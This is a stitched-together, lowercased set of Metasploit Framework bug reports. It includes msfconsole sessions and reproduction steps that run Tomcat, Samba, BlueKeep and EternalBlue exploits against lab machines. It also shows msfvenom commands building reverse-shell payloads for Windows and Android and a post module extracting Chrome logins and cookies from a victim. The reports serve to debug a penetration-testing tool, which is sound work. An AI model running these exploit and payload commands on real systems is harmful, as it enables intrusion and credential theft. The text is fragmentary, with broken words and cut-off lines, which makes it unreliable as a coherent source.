+ -- --=[ 7 evasion ]
use tomcat mgr
msf6 exploit(multi/http/tomcat_mgr_upload) > options module options (exploit/multi/http/tomcat_mgr_upload): name current setting required description ---- --------------- -------- ----------- httppassword xxxxxx no the password for the specified username httpusername bob no the username to authenticate as proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts tryhackme box ip yes the target host(s), range cidr identifier, or hosts file with syntax 'file:<path>' rport 80 yes the target port (tcp) ssl false no negotiate ssl/tls for outgoing connections targeturi /manager yes the uri path of the manager app (/html/upload and /undeploy will be used) vhost no http server virtual host payload options (java/meterpreter/reverse_tcp): name current setting required description ---- --------------- -------- ----------- lhost xxx.xxx.xxx.xxx yes the listen address (an interface may be specified) lport 4444 yes the listen port exploit target: id name -- ---- 0 java universal ```
run exploit
msf6 exploit(multi/http/tomcat_mgr_upload) > exploit [-] exploit failed: nomethoderror undefined method `get_service' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? get_msf_version
[*] exploit completed, but no session was created
or msf6 exploit(multi/http/tomcat_mgr_upload) > run [-] exploit failed: nomethoderror undefined method `get_service' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? get_msf_version
[-] exploit failed: 784: unexpected token at '<h1>internal server error</h1>'
[*] exploit completed, but no session was created
--- rsions.
create a reverse_tcp apk with msfvenom, following the youtube video that has worked for me before on msf5.
created a reverse_tcp handler on my host and clicked the apk.
no sessions found
reverted back to msf5 in kali linux and it worked again instantly
first have a samba server with smb 1 disabled
within mfsconsole:
use use exploit/linux/samba/is_known_pipename
set rhosts <server_address>
set verbose true
testing against samba 3.5.0, the `delete` call made after successfully creating a target file can result in an eoferror (despite succeeding in triggering a deletion on the server side), causing `is_known_pipename` to fail as it cannot identify a writable directory
(specifically, this eoferror causes the received response to the `setfileinformation` request to be coerced to an `emptypacket`, which fails its `valid?` check because it is not empty)
one workaround is to ignore the success/failure states of the deletion operation, and rely only on the success/failure of the file's creation, and the write operation to same: ```patch
diff --git a/modules/exploits/linux/samba/is_known_pipename.rb b/modules/exploits/linux/samba/is_known_pipename.rb
index 344421630d..e4058a0454 100644
--- a/modules/exploits/linux/samba/is_known_pipename.rb
+++ b/modules/exploits/linux/samba/is_known_pipename.rb
@@ -158,10 +158,19 @@ class metasploitmodule < msf::exploit::remote wfd = simple.open(filename, 'rwct') wfd << rex::text.rand_text_alpha(8)
- wfd.close
- simple.delete(filename)
- return true
+ result = wfd.close
+ if result.name == "status_success" then
+ simple.delete(filename)
+ rescue ::rex::proto::smb::exceptions::errorcode, rubysmb::error::rubysmberror => e
+ true # ignore error in delete if creation was successful
+ return true
+ simple.delete(filename)
+ return false
+ end rescue ::rex::proto::smb::exceptions::errorcode, rubysmb::error::rubysmberror => e vprint_error("write #{share}#{filename}: #{e}")
msf5 > use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10
msf5 exploit(windows/http/rejetto_hfs_exec) > set rport 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > exploit ```
use exploit/multi/misc/weblogic_deserialize_badattr_extcomp
*ensure database is not connected*
msf5 auxiliary(scanner/ssh/ssh_login) > run [+] 192.168.132.158:22 - success: 'admin:' 'mikrotik chr 6.45.9 (long-term)'
[*] command shell session 1 opened (192.168.135.168:43591 -> 192.168.132.158:22) at 2020-08-07 11:47:29 -0500
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
msf5 auxiliary(scanner/ssh/ssh_login) > use post/networking/gather/enum_mikrotik msf5 post(networking/gather/enum_mikrotik) > set session 1
session => 1
msf5 post(networking/gather/enum_mikrotik) > set verbose true
verbose => true
msf5 post(networking/gather/enum_mikrotik) > run [*] getting version information
[-] post failed: nomethoderror undefined method `id' for nil:nilclass
[-] call stack:
[-] /home/tmoose/rapid7/metasploit-framework/lib/msf/core/auxiliary/mikrotik.rb:174:in `mikrotik_routeros_config_eater'
[-] /home/tmoose/rapid7/metasploit-framework/modules/post/networking/gather/enum_mikrotik.rb:77:in `block in enum_configs'
[-] /home/tmoose/rapid7/metasploit-framework/modules/post/networking/gather/enum_mikrotik.rb:67:in `each'
[-] /home/tmoose/rapid7/metasploit-framework/modules/post/networking/gather/enum_mikrotik.rb:67:in `enum_configs'
[-] /home/tmoose/rapid7/metasploit-framework/modules/post/networking/gather/enum_mikrotik.rb:53:in `run'
[*] post module execution completed
msf5 post(networking/gather/enum_mikrotik) > reload
use auxiliary/gather/enum_dns
set domain digi.ninja
run against my domain it fails with an error at the svr step
change it to github.com and it fails with a similar, but at zone transfer
point it at zonetransfer.me and the zone transfer works, but there are a bunch of warning about parsing rr packets
## expected behaviour dns entries should be displayed without errors
## current behaviour against digi.ninja ```
msf6 auxiliary(gather/enum_dns) > set domain digi.ninja
domain => digi.ninja
msf6 auxiliary(gather/enum_dns) > run [!] dns wildcard is enable or fake dns server
[*] querying dns ns records for digi.ninja
[+] digi.ninja ns: dns2.zoneedit.com
[+] digi.ninja ns: dns1.zoneedit.com
[*] attempting dns axfr for digi.ninja from dns2.zoneedit.com
[*] attempting dns axfr for digi.ninja from dns1.zoneedit.com
[*] querying dns cname records for digi.ninja
[*] querying dns ns records for digi.ninja
[+] digi.ninja ns: dns1.zoneedit.com
[+] digi.ninja ns: dns2.zoneedit.com
[*] querying dns mx records for digi.ninja
[+] digi.ninja mx: alt1.aspmx.l.google.com
[+] digi.ninja mx: alt3.aspmx.l.google.com
[+] digi.ninja mx: aspmx.l.google.com
[+] digi.ninja mx: alt2.aspmx.l.google.com
[+] digi.ninja mx: alt4.aspmx.l.google.com
[*] querying dns soa records for digi.ninja
[+] digi.ninja soa: dns0.zoneedit.com
[*] querying dns txt records for digi.ninja
[+] digi.ninja txt: v=spf1 include:_spf.google.com ~all
[+] digi.ninja txt: keybase-site-verification=rlbqzb0npovxkoawbyjjuwxt8xmvqlpq1nubwa30dq4
[*] querying dns srv records for digi.ninja
[-] auxiliary failed: nomethoderror undefined method `port' for #<dnsruby::rr::in::cname: >
[-] call stack:
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:222:in `block (3 levels) in dns_get_srv'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:218:in `each'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:218:in `block (2 levels) in dns_get_srv'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:213:in `each'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:213:in `block in dns_get_srv'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:212:in `each'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:212:in `dns_get_srv'
[-] /home/robin/tools/network/metasploit-framework/modules/auxiliary/gather/enum_dns.rb:76:in `run'
[*] auxiliary module execution completed ``` a different error from github.com ```
[*] attempting dns axfr for github.com from dns1.p08.nsone.net
[*] attempting dns axfr for github.com from dns2.p08.nsone.net
[*] attempting dns axfr for github.com from dns3.p08.nsone.net
[*] attempting dns axfr for github.com from dns4.p08.nsone.net
[*] attempting dns axfr for github.com from ns-1283.awsdns-32.org
[-] auxiliary failed: errno::econnreset connection reset by peer - recvfrom(2)
[-] call stack:
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:224:in `recv'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:224:in `block (4 levels) in send_tcp'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:222:in `loop'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:222:in `block (3 levels) in send_tcp'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:198:in `catch'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:198:in `block (2 levels) in send_tcp'
[-] /home/robin/tools/network/metasploit-framework/lib/net/dns/resolver/timeouts.rb:53:in `block in timeout'
[-] /usr/share/rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/timeout.rb:95:in `block in timeout'
[-] /usr/share/rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/timeout.rb:33:in `block in catch'
[-] /usr/share/rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/timeout.rb:33:in `catch'
[-] /usr/share/rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/timeout.rb:33:in `catch'
[-] /usr/share/rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/timeout.rb:110:in `timeout'
[-] /home/robin/tools/network/metasploit-framework/lib/net/dns/resolver/timeouts.rb:52:in `timeout'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:197:in `block in send_tcp'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:194:in `each'
[-] /home/robin/tools/network/metasploit-framework/lib/rex/proto/dns/resolver.rb:194:in `send_tcp'
[-] /home/robin/tools/network/metasploit-framework/lib/net/dns/resolver.rb:1030:in `axfr'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:53:in `block in dns_axfr'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:40:in `each'
[-] /home/robin/tools/network/metasploit-framework/lib/msf/core/exploit/dns/enumeration.rb:40:in `dns_axfr'
[-] /home/robin/tools/network/metasploit-framework/modules/auxiliary/gather/enum_dns.rb:68:in `run'
[*] auxiliary module execution completed ``` pointing at zonetransfer.me ```
[*] querying dns ns records for zonetransfer.me
[+] zonetransfer.me ns: nsztm1.digi.ninja
[+] zonetransfer.me ns: nsztm2.digi.ninja
[*] attempting dns axfr for zonetransfer.me from nsztm1.digi.ninja
w, [2020-08-07t09:24:27.867880 #925581] warn -- : failed to parse rr packet from offset: 601
w, [2020-08-07t09:24:27.868028 #925581] warn -- : failed to parse rr packet from offset: 670
w, [2020-08-07t09:24:27.868471 #925581] warn -- : failed to parse rr packet from offset: 962
w, [2020-08-07t09:24:27.868577 #925581] warn -- : failed to parse rr packet from offset: 1017
w, [2020-08-07t09:24:27.869277 #925581] warn -- : failed to parse rr packet from offset: 1533
w, [2020-08-07t09:24:27.869317 #925581] warn -- : failed to parse rr packet from offset: 1598
w, [2020-08-07t09:24:57.912684 #925581] warn -- : failed to parse rr packet from offset: 601
w, [2020-08-07t09:24:57.913029 #925581] warn -- : failed to parse rr packet from offset: 670
w, [2020-08-07t09:24:57.914243 #925581] warn -- : failed to parse rr packet from offset: 962
w, [2020-08-07t09:24:57.914505 #925581] warn -- : failed to parse rr packet from offset: 1017
w, [2020-08-07t09:24:57.916925 #925581] warn -- : failed to parse rr packet from offset: 1533
w, [2020-08-07t09:24:57.917109 #925581] warn -- : failed to parse rr packet from offset: 1598
[+] zonetransfer.me zone transfer: [;; answer received from 81.4.108.41:53 (1983 bytes) ``` the warnings are repeated for the second name server
## system stuff
use `multi/handler` and set the payload to `linux/x64/meterpreter/bind_tcp`
configure `multi/handler` options
launch `multi/handler` and get a shell on a ubuntu 20.04 x64 vm.
run `getuid` within the meterpreter shell
see something similar to the following: ```
msf5 exploit(multi/handler) > exploit [*] started bind tcp handler against 172.27.129.4:56965
[*] sending stage (3012516 bytes) to 172.27.129.4
[*] meterpreter session 2 opened (0.0.0.0:0 -> 172.27.129.4:56965) at 2020-08-05 18:44:20 -0500 meterpreter > getuid
server username: no-user @ gwillcox-virtual-machine (uid=0, gid=0, euid=0, egid=0)
meterpreter >
msfrpc client get module info, i have some errors
>> rpc.call('module.info', 'exploit', 'linux/misc/saltstack_salt_unauth_rce')
traceback (most recent call last): 8: from /usr/bin/msfrpc:92:in `<main>' 7: from /usr/share/metasploit-framework/lib/rex/ui/text/irb_shell.rb:52:in `run' 6: from /usr/share/metasploit-framework/lib/rex/ui/text/irb_shell.rb:52:in `catch' 5: from /usr/share/metasploit-framework/lib/rex/ui/text/irb_shell.rb:53:in `block in run' 4: from (irb):8:in `<main>' 3: from (irb):9:in `rescue in <main>' 2: from /usr/share/metasploit-framework/lib/msf/core/rpc/v10/client.rb:105:in `call' 1: from /usr/share/metasploit-framework/lib/msf/core/rpc/v10/client.rb:163:in `send_rpc_request'
runtimeerror (nil) ```
windows 10 2004 build 19041.388
commandovm version 2020.2 1
unable to run metasploit latest build installed via msi installer downloaded directly from windows.metasploit.com
i get this error when trying to run msfconsole: bundler could not find compatible versions for gem "bcrypt": in gemfile: metasploit-framework x64-mingw32 was resolved to 5.0.101, which depends on bcrypt (= 3.1.12) x64-mingw32 could not find gem \'bcrypt (= 3.1.12)\', which is required by gem \'metasploit-framework\', in any of the sources.
`msfdb delete` to remove existing db
`msfdb init` to create a new webservice db
start `msfconsole`
`db_import <filename>` for a supported file that contains at least one host
observe success message
type `hosts` and see no hosts rsions.
msfdb reinit
msfdb stop && msfdb delete && msfdb init rsions.
get a meterpreter shell on a victims linux box
call mic_list which returns 4 mic's
call mic_start the victim's sysinfo:
os : ubuntu 18.04 (linux 4.15.0-112-generic)
architecture : x64
buildtuple : x86_64-linux-musl
meterpreter : x64/linux
from msfconsole get a meterpreter shell on metasploitable3-win2k8 with exploit/windows/smb/psexec
use sniffer
sniffer_interfaces victim:
computer : metasploitable3
os : windows 2008 r2 (6.1 build 7601, service pack 1).
architecture : x64
system language : en_us
domain : workgroup
logged on users : 2
meterpreter : x86/windows
from msfconsole: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set target 2 (windows 7 sp1 / 2008 r2 (6.1.7601 x64 - virtualbox 6))
set rhosts <victim-ip>
set lhost <attacker-ip>
check -> "the target is vulnerable
the target attempted cleanup of the incorrectly-bound ms_t120 channel."
run the victim:
- computer : metasploitable3
- os : windows 2008 r2 (6.1 build 7601, service pack 1).
- architecture : x64
- firewall is off
- registry-key hklm\\\\system\\\\currentcontrolset\\\\ control\\\\terminalserver\\\\ winstations\\\ dp-tcp\\\\fdisablecam set to 0
replay `exploit/unix/webapp/kimai_sqli`
etrieving file system path... leads to `exploit failed: errno::eisdir is a directory @ rb_sysopen ` ## system stuff windows server 2012 r2
get a session and elevate it to `system` (target: windows 10 18362.959, chrome 84.0.4147.89)
`use post/windows/gather/enum_chrome`
`set session #` 4
here is the output i get, the module seems to be successfully downloading the encrypted data, but fails when decrypting:
[*] impersonating token: 8416
[*] running as user 'desktop-j5v2tdv\\carter'...
[*] extracting data for user 'carter'...
[+] downloaded web data to '/home/carter/.msf4/loot/20200724171441_default_10.0.0.63_chrome.raw.webd_375228.txt'
[+] downloaded cookies to '/home/carter/.msf4/loot/20200724171442_default_10.0.0.63_chrome.raw.cooki_297747.txt'
[+] downloaded history to '/home/carter/.msf4/loot/20200724171444_default_10.0.0.63_chrome.raw.histo_379302.txt'
[+] downloaded login data to '/home/carter/.msf4/loot/20200724171502_default_10.0.0.63_chrome.raw.login_786115.txt'
[+] downloaded bookmarks to '/home/carter/.msf4/loot/20200724171503_default_10.0.0.63_chrome.raw.bookm_741739.txt'
[+] downloaded preferences to '/home/carter/.msf4/loot/20200724171503_default_10.0.0.63_chrome.raw.prefe_697568.txt'
[-] post failed: rex::post::meterpreter::requesterror stdapi_sys_process_attach: operation failed: access is denied.
[-] call stack:
[-] /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:97:in `_open'
[-] /opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:78:in `open'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:102:in `decrypt_data'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:159:in `block (3 levels) in process_files'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:156:in `each'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:156:in `block (2 levels) in process_files'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:152:in `map!'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:152:in `block in process_files'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:136:in `each'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:136:in `process_files'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:327:in `block in run'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:324:in `each'
[-] /opt/metasploit-framework/embedded/framework/modules/post/windows/gather/enum_chrome.rb:324:in `run'
[*] post module execution completed
in powershell, run `.\\msfvenom -p windows/shell/reverse_tcp lhost=10.10.0.10 lport=4444 -f exe > shell-x86.exe`
```powershell
ps c:\\metasploit-framework\\bin> .\\msfvenom -p windows/shell/reverse_tcp lhost=10.10.0.10 lport=4444 -f exe > shell-x86.exe
c:/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/activesupport-4.2.11.3/lib/active_support/dependencies.rb:274: warning: win32api is deprecated after ruby 1.9.1; use fiddle directly instead
[-] no platform was selected, choosing msf::module::platform::windows from the payload
[-] no arch selected, selecting arch: x86 from the payload
no encoder specified, outputting raw payload
payload size: 341 bytes
final size of exe file: 73802 bytes
``` also reproduced this issue generating the x64 shell payload exe the valid pe is generated if run under cmd.exe windows 10 1809 64-bit
metasploit 5.0.100
#### generate a stock stager ```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.150 lport=8444 -f exe -o ./msf-stock-payload.exe
[-] no platform was selected, choosing msf::module::platform::windows from the payload
[-] no arch selected, selecting arch: x64 from the payload
no encoder specified, outputting raw payload
payload size: 510 bytes
final size of exe file: 7168 bytes
saved as: ./msf-stock-payload.exe
``` #### start stage handler ```
msf5 > use exploit/multi/handler
[*] using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lport 8444
lport => 8444
msf5 exploit(multi/handler) > set enablestageencoding true
enablestageencoding => true
msf5 exploit(multi/handler) > set stageencoder x64/zutto_dekiru
stageencoder => x64/zutto_dekiru
msf5 exploit(multi/handler) > exploit -j
[*] exploit running as background job 0.
[*] exploit completed, but no session was created
[*] started reverse tcp handler on 0.0.0.0:8444
``` #### result ```
[*] encoded stage with x64/zutto_dekiru
[*] sending encoded stage (201339 bytes) to 192.168.1.115
[*] meterpreter session 185 opened (192.168.1.150:8444 -> 192.168.1.115:52670) at 2020-07-17 10:14:09 -0500
[*] 192.168.1.115 - meterpreter session 185 closed
reason: died
``` this result is consistent across multiple attempts, jobs, executions, etc
i also wrote a custom stager in c, which exhibits similar results when using stageencoding, though maybe 1/10 attempts it will work.
background a reverse shell session i have on a target with ctrl-z.
use post/multi/recon/local_exploit_suggester
set session x
i tested last version of kali linux and parrot os and i attacked a machine in hackthebox.eu (machine heist)
use auxiliary/scanner/winrm/winrm_login
set rhost 10.10.10.149
4 set pass_file passwords.txt
5 set user_file users.txt
6 run kali reports all users incorrect
parrot report the expected users as successful
both os were fresh installations in vm
search the exploit `search eternalblue`
try and include the exploit using `use exploit/windows/smb/ms17_010_eternalblue_win8`
try and do tab completion, the exploit doesn't show up there either the exploit shows up in search but while including it doesn't work
sounds dumb but i think the exploit is either broken or wasn't included in the version i'm using.
i set the environment var msf_ws_json_rpc_api_token
start json_rpc server
it can't access service via the token rsions.
environment:
on server machine using:
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
``` client is an android smartphone running an msfvenom created apk
meterpreter > sysinfo
computer : localhost
os : android 5.1.1 - linux 3.10.65-11885619 (armv7l)
meterpreter : dalvik/android
``` issue when triying to execute : ```
wlan_geolocate -a my_api_key
``` i get the folowing error:
[-] error running command wlan_geolocate: nomethoderror undefined method `[]' for nil:nilclass
opened metasploit and used exploit/windows/smb/ms17_010_eternalblue
set options and exploited
victim: windows 10 build 1511 (virtual machine)
run exploit in #13604 on a linux target
watch it fail
there appears to be an issue when trying to kill a job by it's id
i can reliably reproduce it but only for auxiliary modules (sock4a and socks5) while others like exploit/multi/handler can be killed by it's id
to reproduce it: 1
start an auxiliary server module
find it's job id with the output of `jobs`
try to kill the specific job using either `jobs -k <id>` or `kill <id>`, both are exhibiting the same behavior ```
./msfconsole -r test.rc mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mmmmmmmmmmm mmmmmmmmmm
mmmn$ vmmmm
mmmnl mmmmm mmmmm jmmmm
mmmnl mmmmmmmn nmmmmmmm jmmmm
mmmnl mmmmmmmmmnmmmnmmmmmmmmm jmmmm
mmmni mmmmmmmmmmmmmmmmmmmmmmm jmmmm
mmmni mmmmmmmmmmmmmmmmmmmmmmm jmmmm
mmmni mmmmm mmmmmmm mmmmm jmmmm
mmmni mmmmm mmmmmmm mmmmm jmmmm
mmmni mmmnm mmmmmmm mmmmm jmmmm
mmmni wmmmm mmmmmmm mmmm# jmmmm
mmmmr ?mmnm mmmmm .dmmmm
mmmmnm `?mmm mmmm` dmmmmm
mmmmmmn ?mm mm? nmmmmmn
mmmmmmmmne jmmmmmnmmm
mmmmmmmmmmnm, emmmmmnmmnmm
mmmmnnmnmmmmmnx mmmmmmnmmnmmnm
mmmmmmmmnmmnmmmmm+..+mmnmmnmnmmnmmnmm =[ metasploit v5.0.93-dev-fa496b9395 ]
+ -- --=[ 2028 exploits - 1102 auxiliary - 344 post ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops ]
+ -- --=[ 7 evasion ] metasploit tip: view missing module options with show missing [*] processing test.rc for erb directives.
resource (test.rc)> use auxiliary/server/socks5
resource (test.rc)> run
[*] auxiliary module running as background job 0.
resource (test.rc)> jobs jobs
==== id name payload payload opts -- ---- ------- ------------ 0 auxiliary: server/socks5 resource (test.rc)> sleep 5
[*] starting the socks5 proxy server
resource (test.rc)> jobs -k 0
[*] stopping the following job(s): 0
[-] error while running command jobs: undefined method `datastore\' for "37vapvkhtwwsozey7t3b3ld0":string call stack:
/home/smcintyre/repositories/metasploit-framework/lib/msf/ui/console/command_dispatcher/jobs.rb:216:in `block in cmd_jobs'
/home/smcintyre/repositories/metasploit-framework/lib/msf/ui/console/command_dispatcher/jobs.rb:213:in `each'
/home/smcintyre/repositories/metasploit-framework/lib/msf/ui/console/command_dispatcher/jobs.rb:213:in `cmd_jobs'
/home/smcintyre/repositories/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/home/smcintyre/repositories/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/home/smcintyre/repositories/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/home/smcintyre/repositories/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/home/smcintyre/repositories/metasploit-framework/lib/rex/ui/text/resource.rb:70:in `load_resource'
/home/smcintyre/repositories/metasploit-framework/lib/msf/ui/console/driver.rb:181:in `block in initialize'
/home/smcintyre/repositories/metasploit-framework/lib/msf/ui/console/driver.rb:180:in `each'
/home/smcintyre/repositories/metasploit-framework/lib/msf/ui/console/driver.rb:180:in `initialize'
/home/smcintyre/repositories/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `new'
/home/smcintyre/repositories/metasploit-framework/lib/metasploit/framework/command/console.rb:62:in `driver'
/home/smcintyre/repositories/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/smcintyre/repositories/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:23:in `<main>'
resource (test.rc)> exit
[*] starting persistent handler(s)...
[*] stopping the socks5 proxy server
``` <details>
<summary>rc script</summary> ```
use auxiliary/server/socks5
- you can change the sf in the code to any character,like 'kt' ``` ruby
# lib/msf/ui/web/console.rb
# initialize the console with our pipe
self.console = msf::ui::console::driver.new( 'kt', '#', opts.merge({ 'framework' => self.framework, 'localinput' => self.pipe, 'localoutput' => self.pipe, 'allowcommandpassthru' => true, 'resource' => [], })
- start json-rpc service
bundle exec thin --rackup msf-json-rpc.ru --address rpc.kali-team.cn --port 8081 --ssl --ssl-key-file /home/kali-team/.msf4/msf-ws-key.pem --ssl-cert-file /home/kali-team/.msf4/msf-ws-cert.pem --ssl-disable-verify --environment development --log /home/kali-team/.msf4/logs/msf-ws.log --pid /home/kali-team/.msf4/msf-ws.pid --tag msf-json-rpc --debug start --threaded
- create a console
curl --request post \\ --url \\ --header \'authorization: bearer 4609b894a5df47bc165f33ae9359ddf4b077fe83803fc390848d45652d4991b7c918c2055a9b3654\' \\ --header \'content-type: application/json\' \\ --data \'{ "jsonrpc": "2.0", "method": "console.create", "id": 0
- list console
curl --request post \\ --url \\ --header \'authorization: bearer 4609b894a5df47bc165f33ae9359ddf4b077fe83803fc390848d45652d4991b7c918c2055a9b3654\' \\ --header \'content-type: application/json\' \\ --data \'{ "jsonrpc": "2.0", "method": "console.list", "id": 0
{ "jsonrpc": "2.0", "result": { "consoles": [ { "id": "0", "prompt": " sf5 > ", "busy": false } ] }, "id": 0
- the default prompt will be returned no matter what character is modified
- after fixing the bug
{ "jsonrpc": "2.0", "result": { "consoles": [ { "id": "0", "prompt": "web_msf > ", "busy": false } ] }, "id": 0
# customizing the webconsole prompt
- create console,the custom prompt is 'kt', prompt_char is '#'
curl --request post \\ --url \\ --header \'authorization: bearer 4609b894a5df47bc165f33ae9359ddf4b077fe83803fc390848d45652d4991b7c918c2055a9b3654\' \\ --header \'content-type: application/json\' \\ --data \'{ "jsonrpc": "2.0", "method": "console.create", "params": [ { "prompt": "kt", "promptchar": "#" } ], "id": 0
{ "jsonrpc": "2.0", "result": { "consoles": [ { "id": "0", "prompt": "web_msf > ", "busy": false }, { "id": "1", "prompt": "kt # ", "busy": false } ] }, "id": 0
thank you for your guidance @timwr
use post/multi/manage/shell_to_meterpreter.
set session 1
run [*] upgrading session id: 1
[*] starting exploit/multi/handler
[*] started reverse tcp handler on 10.2.2.64:4433 [*] post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > [*] sending stage (176195 bytes) to 10.10.30.73
[*] meterpreter session 2 opened (10.2.2.64:4433 -> 10.10.30.73:49178) at 2020-05-15 21:40:29 -0400
[*] stopping exploit/multi/handler
[*] 10.10.30.73 - meterpreter session 2 closed
reason: died the exploit handler never stops
i'm running a vmware image
i was using virtual box previously, thinking it may have something to do with the network adapter, but the same thing is happening with vmplayer
i should get a meterpreter shell meterpreter sessions doesn't complete
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces if i attempt to run it again:
[*] upgrading session id: 1
[*] starting exploit/multi/handler
[*] started reverse tcp handler on 10.2.2.64:4433 [-] post failed: nomethoderror undefined method `reverse!' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:136:in `shell_command_token_win32'
[-] /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:84:in `shell_command_token'
[-] /usr/share/metasploit-framework/lib/msf/core/post/common.rb:147:in `cmd_exec'
[-] /usr/share/metasploit-framework/lib/msf/core/post/windows/powershell.rb:32:in `have_powershell?'
[-] /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:161:in `run framework: 5.0.87-dev
console : 5.0.87-dev ### i installed metasploit with:
- [ ] kali pre installed what os are you running metasploit on?
not works :
msfvenom -p windows/x64/meterpreter/reverse_http lhost=1.1.1.1 lport=80 luri=/index/64 httpcookie='init=yes' -f exe -o /tmp/stager.exe works :
msfvenom -p windows/meterpreter/reverse_http lhost=1.1.1.1 lport=80 luri=/index/32 httpcookie='init=yes' -f exe -o /tmp/stager.exe
the `bufferregister` is not marked as required: ```
msf5 > use encoder/x86/unicode_upper msf5 encoder(x86/unicode_upper) > show options module options (encoder/x86/unicode_upper): name current setting required description ---- --------------- -------- ----------- allowwin32seh false yes use seh to determine the address of the stub (windows only) bufferoffset 0 no the offset to the buffer from the start of the register bufferregister no the register that pointers to the encoded payload
``` but it is actually required in the implementation: #l32-l39 a simple command to test this is to use msvvenom without the bufferregister supplied, which produces an error: `msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 exitfunc=seh -e x86/unicode_upper -f raw` this also happens with **x86/unicode_mixed**
create a folder on a remote linux target
2.place another folder in that folder
run `rm_rf` from the file.rb library
watch it not delete the directory
repeat steps 1 & 2
run cmd_exec("rm -rf "\\"#{path}"\\")
watch it succeed
this happens because if you check out `rm_rf`, you can see:
``` # # delete remote directories # # @param remote_dirs [array<string>] list of remote directories to # delete # @return [void] def rm_rf(*remote_dirs) remote_dirs.each do |remote| if session.type == "meterpreter" session.fs.dir.rmdir(remote) if exist?(remote) else if session.platform == \'windows\' cmd_exec("rd /s /q \\"#{remote}\\"") else cmd_exec("rm -rf \\"#{remote}\\"") end end end end alias :file_rm :rm_f alias :dir_rm :rm_rf
``` if you have a meterpreter session, it calls `session.fs.dir.rmdir` which in a linux meterpreter goes through to the eio library which calls `rmdir` from `unistd` (
that's not equivalent to `rm -rf`, which is what is called if you have a shell session
specifically, `rmdir` will fail if it is not empty, which is sort of the point of `-rf`
either we should just remove the meterpreter condition in rm_rf and always call cmd_exec, or we should see if there's a way to make the meterpreter case and the shell case act in a similar fashion.
you can see an example of that confusion causing problems here:
